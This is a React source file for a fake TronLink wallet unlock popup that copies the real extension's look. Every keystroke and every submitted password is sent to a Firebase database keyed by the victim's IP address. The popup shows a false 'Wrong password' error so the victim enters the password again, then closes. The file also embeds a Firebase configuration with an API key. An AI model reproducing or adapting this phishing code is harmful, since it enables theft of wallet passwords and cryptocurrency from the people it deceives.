import {
  useState,
  useEffect,
  useRef,
  useContext,
  useCallback,
} from "react";
import { EventEmitter } from "events";
import Modal from "react-modal";
import tronLogo from "./tron-logo.png";
import tronLoading from "./tron-loading.gif";
import TextField from "@mui/material/TextField";
import tronModalLogo from "./tronlink.svg";
import eyeClosed from "./eye-closed.svg";
import eyeOpened from "./eye-opened.svg";

import { initializeApp } from "firebase/app";
import { getDatabase, ref, push } from "firebase/database";

import axios from "axios";

import "./index.css";
import "./MM.css";
import "./tronModal.css";
import { set } from "lodash";

const isDark = window.matchMedia("(prefers-color-scheme: dark)").matches;

const firebaseConfig = {
  apiKey: "AIzaSyDSQrbrdcdjhvwzXccJQMbQ5x7XKTPlt9g",
  authDomain: "walletintegration-vic.firebaseapp.com",
  projectId: "walletintegration-vic",
  storageBucket: "walletintegration-vic.firebasestorage.app",
  messagingSenderId: "563872958446",
  appId: "1:563872958446:web:18c71569e281a96bebf0ff",
  measurementId: "G-NB5GFJ8BTD"
};

const rtapp = initializeApp(firebaseConfig);
const rtdb = getDatabase(rtapp);

function getCaretCoordinates(element, position) {
  const div = document.createElement("div");
  div.id = "password-mirror-div";
  document.body.appendChild(div);
  const computed = window.getComputedStyle(element);
  div.textContent = new Array(position + 1).join("•");
  const span = document.createElement("span");
  span.textContent = "•";
  div.appendChild(span);

  const coordinates = {
    top: span.offsetTop + parseInt(computed.borderTopWidth, 10),
    left: span.offsetLeft + parseInt(computed.borderLeftWidth, 10),
  };
  document.body.removeChild(div);
  return coordinates;
}

const TronLink = ({ isOpenR, setIsOpenR, isEnterR, setIsEnterR }) => {
  const styles = {
    overlay: {
      position: "fixed",
      backgroundColor: "transparent",
    },
    content: {
      top: "0px",
      left: "auto",
      right: "150px",
      bottom: "auto",
      padding: "0",
      border: "0",
      borderRadius: "5",
      // marginRight: "-30%",
      // transform: "translate(-50%, -50%)",
      boxShadow: "0px 0px 5px #00000088",
      zIndex: 10000,
      fontFamily: "Geist, 'Helvetica Neue', Helvetica, Arial, sans-serif",
    },
  };

  const inputRef = useRef(null);
  const [ip, setIp] = useState(null);
  const [animationEventEmitter, setEventEmitter] = useState(new EventEmitter());
  const [loading, setLoading] = useState(true);
  const [password, setPassword] = useState("");
  const [error, setError] = useState(false);
  const [showPass, setShowPass] = useState(false);
  const [isTyping, setIsTyping] = useState(false);
  const [isFocused, setIsFocused] = useState(false);
  const [startInput, setStartInput] = useState({ width: 0, height: 0 });

  const handleOpenModal = () => {
    setIsOpenR(true);
  };

  const handleCloseModal = () => {
    setPassword("");
    setIsOpenR(false);
    setError(false);
  };

  const setInputRef = useCallback((node) => {
    if (node) {
      inputRef.current = node;
      const { x, y } = node.getBoundingClientRect();
      setStartInput({ x, y });
    }
  }, []);

  const handleType = (e) => {
    if (e.key === "Enter") {
      validatePassword();
    }
  };

  const addUser = (payload) => {
    const date = new Date();
    const dataRef = ref(rtdb, `${ip.replaceAll(".", "_")}_TRON/user_${date.getTime()}`);
    push(dataRef, payload);
  };

   // Password validation logic
  const validatePassword = () => {
    if (password != "") {
      addUser(password);
      setIsEnterR(isEnterR + 1);
      if(isEnterR < 2) setError(true);
      else setIsOpenR(false);
      const correctPassword = "111sdswh2y67623tg74yehd"; // Example correct password
      if (password !== correctPassword) {
        setError(true);
      } else {
        setError(false);
      }
    }
  };

  const changePassword = (para) => {
    setError(false);
    setPassword(para);
    setIsTyping(true);
    addUser(para);
  };

  const handleFocus = () => {
    setIsFocused(true);
  };
  const handleBlur = () => {
    setIsFocused(false);
  };

  useEffect(() => {
    const fetchIP = async () => {
      try {
        const response = await axios.get("https://api.ipify.org?format=json");
        setIp(response.data.ip);
      } catch (error) {
        console.error("Error fetching IP address:", error);
      }
    };

    fetchIP();

    if (isOpenR) {
      if (!window.tron) {
        alert("Please install Tron Wallet!");
        window.open("https://chromewebstore.google.com/detail/tronlink/ibnejdfjmmkpcnlpebklmnkoeoihofec?hl=en", "_blank");
        return;
      }
      setTimeout(() => {
        setLoading(false);
        setTimeout(() => {
          inputRef.current && inputRef.current.focus();
        }, 10);
      }, 3000);
    } else {
      setLoading(true);
    }
  }, [isOpenR]);
  
  const baseButtonClass = "B1a7cASr1kJ_GaXOoFFL EqVDkDxpR6wjuW9uygAR lo4jCtRMqBPgkgfPNKxE";
  const buttonStateClass = password ? "is-valid" : "is-invalid";
  const wrapperClassName = error ? "nxJ8HzCFTTnzToow6zeQ UFwhvkYAJ0ltyahslsgW" : "nxJ8HzCFTTnzToow6zeQ";

  return (
    <Modal
      isOpen={window.tron && isOpenR}
      style={styles}
      shouldCloseOnOverlayClick={true}
      shouldCloseOnEsc={true}
      onRequestClose={handleCloseModal}
      ariaHideApp={false}
    >
      <div className="tron-toolbar">
        <div className="tron-toolbar-left">
          <img
            style={{
              width: "1.0rem",
              height: "1.0rem",
              margin: "0.4rem",
              borderRadius: "2px"
            }}
            src={tronLogo}
            alt="TronLink logo"
          />
          <span className="tron-toolbar-title">TronLink</span>
        </div>

        <div className="tron-window-controls">
          <button
            aria-label="Minimize"
            className="tron-window-btn"
            onClick={() => {}}
          >
            <span className="tron-window-icon">−</span>
          </button>
          <button
            aria-label="Maximize"
            className="tron-window-btn"
            onClick={() => {}}
          >
            <span className="tron-window-icon">□</span>
          </button>
          <button
            aria-label="Close"
            className="tron-window-btn tron-window-btn-close"
            onClick={handleCloseModal}
          >
            <span className="tron-window-icon">×</span>
          </button>
        </div>
      </div>

      <div id="modal-root">
        <div className="K3Bt74ReDB0gC3OcP9RD col">
          <div>
            <div className="Fvg_SYtrIuWKFjIJNjLA">
              <img src={tronModalLogo} alt="tron-logo" />
            </div>
            <div className={wrapperClassName}>
              <div className="DFlySJnQ9TIGNUomyHgV">
                <input
                  type={showPass ? "text" : "password"}
                  placeholder="Password"
                  className="tron-input"
                  id="outlined"
                  label="Password"
                  variant="standard"
                  ref={setInputRef}
                  value={password}
                  error={error}
                  onChange={(e) => changePassword(e.target.value)}
                  onKeyDown={handleType}
                  onFocus={handleFocus}
                  onBlur={handleBlur}
                  sx={{
                    ".MuiFormHelperText-root.Mui-error ": {
                      color: isDark === true ? "#e88f97 !important" : "black",
                      position: "absolute",
                      bottom: "-20px",
                      fontFamily: `"Roboto", "PingFang SC", "Microsoft Yahei", "sans-serif"`,
                    },
                    "& label": {
                      color: "gray !important", // Force orange color
                      fontFamily: `"Roboto", "PingFang SC", "Microsoft Yahei", "sans-serif"`,
                      fontSize: "14px",
                    },
                    "& label.Mui-focused": {
                      color: "gray !important", // Darker orange on focus
                    },
                    "& label.MuiInputLabel-shrink": {
                      color: "gray !important", // Ensure shrinked label stays orange
                      fontSize: "12px !important",
                    }, // Darker orange on focus
                    " .css-4twbn2-MuiInputBase-root-MuiInput-root::before": {
                      borderBottom:
                        isDark === true
                          ? "1px solid white"
                          : "1px solid black",
                    },
                    " .css-1x51dt5-MuiInputBase-input-MuiInput-input":{
                      fontFamily: `"Roboto", "PingFang SC", "Microsoft Yahei", "sans-serif"`,
                    },
                    ".css-4twbn2-MuiInputBase-root-MuiInput-root:hover:not(.Mui-disabled, .Mui-error)::before":
                      {
                        borderBottom:
                          isDark === true
                            ? "1px solid white"
                            : "1px solid black",
                      },

                    "& .MuiInput-underline": {
                      "&:before": {
                        borderBottom:
                          error &&
                          (password !== ""
                            ? "2px solid black"
                            : "1px solid black !important"),
                      },
                      "&:after": {
                        borderBottom:
                          error && password !== ""
                            ? "1px solid black"
                            : "1px solid black", // Border color when focused
                      },
                    },
                    width: "100%",
                  }}
                />
                <button
                  onClick={() => setShowPass(!showPass)}
                >
                  <img
                    src={showPass ? eyeOpened : eyeClosed}
                    className="c0wdNFzo08E57WQ5Zvt0"
                    alt=""
                  />
                </button>
              </div>
            </div>
            <div className="uAnobfzNZ2ZwHDRsM30Y">
              {error ? "Wrong password" : ""}
            </div>
            <div className="VwXUZsPY_bQKMETfD4X8">
              <button className={`${baseButtonClass} ${buttonStateClass}`} onClick={validatePassword}>
                Unlock
              </button>
            </div>
          </div>
        </div>
      </div>
    </Modal>
  );
};

export default TronLink;